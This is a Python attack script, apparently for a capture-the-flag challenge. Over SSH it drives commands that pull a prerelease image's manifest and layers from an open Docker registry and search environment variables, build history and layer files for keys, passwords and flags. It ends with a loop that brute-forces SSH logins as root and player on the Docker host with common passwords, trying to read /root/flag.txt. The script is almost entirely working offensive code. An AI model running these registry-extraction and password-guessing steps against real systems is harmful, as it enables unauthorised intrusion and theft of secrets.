#!/usr/bin/env python3
"""Full extraction of prerelease image layers"""
import paramiko

HOST = "instance.ctf.tdho.st"
PORT = 32971
USER = "player"
PASSWORD = "reyalp"

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(HOST, port=PORT, username=USER, password=PASSWORD)

def cmd(c, timeout=20):
    stdin, stdout, stderr = ssh.exec_command(c, timeout=timeout)
    return (stdout.read() + stderr.read()).decode()

print("[*] Full image extraction...")

# Get the actual manifest (not the index)
extract_all = '''python3 << 'PY'
import urllib.request
import json
import gzip
import tarfile
import io

reg = "http://172.27.0.1:5000"
img = "images/stolen-schematics-game-server-prerelease"

# Get the platform-specific manifest
manifest_digest = "sha256:5af0a96cb98dddb925de287fc977fc2b957423b1880be447ae441f675e482100"
req = urllib.request.Request(
    f"{reg}/v2/{img}/manifests/{manifest_digest}",
    headers={"Accept": "application/vnd.oci.image.manifest.v1+json"}
)
with urllib.request.urlopen(req) as r:
    manifest = json.loads(r.read().decode())
    print("[MANIFEST]", json.dumps(manifest, indent=2)[:2000])
    
    # Get config
    if 'config' in manifest:
        config_digest = manifest['config']['digest']
        print(f"\\n[Fetching config: {config_digest}]")
        with urllib.request.urlopen(f"{reg}/v2/{img}/blobs/{config_digest}") as cr:
            config = json.loads(cr.read().decode())
            
            # Check for secrets in ENV
            if 'config' in config and 'Env' in config['config']:
                print("\\n[ENVIRONMENT VARIABLES]:")
                for env in config['config']['Env']:
                    print(f"  {env}")
                    if any(x in env.lower() for x in ['pass', 'key', 'secret', 'token', 'flag']):
                        print(f"    ^^ POTENTIAL SECRET!")
            
            # Check history for commands with secrets
            if 'history' in config:
                print("\\n[BUILD HISTORY]:")
                for i, h in enumerate(config['history']):
                    cmd = h.get('created_by', '')
                    if any(x in cmd.lower() for x in ['password', 'secret', 'key', 'flag', 'ssh']):
                        print(f"  Layer {i}: {cmd[:200]}")
    
    # Download and extract each layer
    if 'layers' in manifest:
        print(f"\\n[Found {len(manifest['layers'])} layers]")
        for i, layer in enumerate(manifest['layers']):
            digest = layer['digest']
            size = layer['size']
            print(f"\\nLayer {i}: {digest} ({size} bytes)")
            
            try:
                with urllib.request.urlopen(f"{reg}/v2/{img}/blobs/{digest}") as br:
                    blob_data = br.read()
                    
                    # Try to decompress and extract
                    try:
                        # Decompress gzip
                        decompressed = gzip.decompress(blob_data)
                        print(f"  Decompressed: {len(decompressed)} bytes")
                        
                        # Extract tar
                        tar = tarfile.open(fileobj=io.BytesIO(decompressed))
                        members = tar.getmembers()
                        print(f"  Files: {len(members)}")
                        
                        # Look for interesting files
                        for member in members:
                            if any(x in member.name for x in ['flag', 'ssh', 'key', '.pem', 'secret', 'password', 'sync-loop']):
                                print(f"    FOUND: {member.name}")
                                if member.isfile() and member.size < 10000:
                                    content = tar.extractfile(member).read().decode('utf-8', errors='ignore')
                                    print(f"      Content: {content[:500]}")
                        
                        tar.close()
                    except Exception as e:
                        print(f"  Extract error: {e}")
            except Exception as e:
                print(f"  Download error: {e}")
PY
'''

print(cmd(extract_all, timeout=45))

# Also check SSH to Docker host with default creds
print("\n[*] Attempting SSH to Docker host...")
ssh_test = '''
# Try common weak passwords
for pw in reyalp password admin root 123456 talldwarf; do
    echo "Trying password: $pw"
    sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@172.27.0.1 "cat /root/flag.txt" 2>&1 | head -3
    sshpass -p "$pw" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 player@172.27.0.1 "cat /root/flag.txt" 2>&1 | head -3
done
'''
print(cmd(ssh_test, timeout=30))

ssh.close()
